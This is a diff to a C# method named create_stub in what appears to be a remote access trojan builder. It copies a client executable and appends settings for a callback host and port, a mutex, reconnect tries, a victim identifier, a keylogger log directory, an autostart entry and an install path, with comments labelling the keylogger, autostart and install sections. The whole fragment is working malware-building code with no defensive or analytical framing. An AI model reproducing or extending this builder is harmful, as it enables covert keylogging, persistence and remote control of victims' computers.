@@ -16,9 +16,8 @@ namespace Serveur.Controllers
 
         }
 
-        public void create_stub(string host, string port, string mutex, string numReconnectTries, string clientID,
-            string klEnabled, string  klDirectory,
-            string autoStart, string startupName)
+        public void create_stub(string host, string port, string mutex, string recoTries, string identifier,
+             string logDir, string startupName, string txtSubDirI, string txtFileNameI, string installPath, string chkPart)
         {
             SaveFileDialog save_file = new SaveFileDialog();
             try
@@ -30,15 +29,22 @@ namespace Serveur.Controllers
                     File.Copy(Application.StartupPath + "\\client.exe", save_file.FileName);
                     FileStream stream = new FileStream(save_file.FileName, FileMode.Append);
                     BinaryWriter writer = new BinaryWriter(stream);
+                    // LOG IN SETTINGS
                     writer.Write("-STARThost-" + host + "-ENDhost-");
                     writer.Write("-STARTport-" + port + "-ENDport-");
                     writer.Write("-STARTmutex-" + getUniqueMutex(18) + "-ENDmutex-");
-                    writer.Write("-STARTrecoTries-" + numReconnectTries + "-ENDrecoTries-");
-                    writer.Write("-STARTclientID-" + clientID + "-ENDclientID-");
-                    writer.Write("-STARTklEnabled-" + klEnabled + "-ENDklEnabled-");
-                    writer.Write("-STARTklDirectory-" + klDirectory + "-ENDklDirectory-");
-                    writer.Write("-STARTautoStart-" + autoStart + "-ENDautoStart-");
+                    writer.Write("-STARTrecoTries-" + recoTries + "-ENDrecoTries-");
+                    writer.Write("-STARTidentifier-" + identifier + "-ENDidentifier-");
+                    // KEYLOGGER SETTINGS
+                    writer.Write("-STARTlogDir-" + logDir + "-ENDlogDir-");
+                    // AUTOSTART SETTINGS
                     writer.Write("-STARTstartupName-" + startupName + "-ENDstartupName-");
+                    // INSTALL SETTINGS
+                    writer.Write("-STARTinstallPath-" + installPath + "-ENDinstallPath-");
+                    writer.Write("-STARTtxtSubDirI-" + txtSubDirI + "-ENDtxtSubDirI-");
+                    writer.Write("-STARTtxtFileNameI-" + txtFileNameI + "-ENDtxtFileNameI-");
+                    // BOOLEENS
+                    writer.Write("-STARTchk-" + chkPart + "-ENDchk-");
                     writer.Flush();
                     writer.Close();
                     stream.Close();
